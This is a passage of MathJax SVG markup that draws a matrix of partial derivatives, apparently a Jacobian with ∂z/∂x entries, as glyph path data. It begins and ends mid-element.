404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g></g><rect width=\"1477.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,1085)\"><g data-mml-node=\"mtd\" transform=\"translate(99.9,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(257.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1313.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(2853.1,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(257.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><rect width=\"1313.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(5561.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(7806.4,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(339.8,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g></g></g><rect width=\"1477.4\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-1286.6)\"><g data-mml-node=\"mtd\" transform=\"translate(737.6,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3490.8,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(5506.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22F1\" d=\"M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(8526,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-2888.3)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(319.9,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1513.2\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(2753.2,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(319.9,-345.6) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g><rect width=\"1513.2\" height=\"60\" x=\"120\" y=\"220\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(5561.4,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(7788.4,0)\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,446.1) scale(0.707)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D467\" d=\"M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(498,-150) scale(0.707)\"><path data-c=\"1D440\" d=\"M289 629Q289 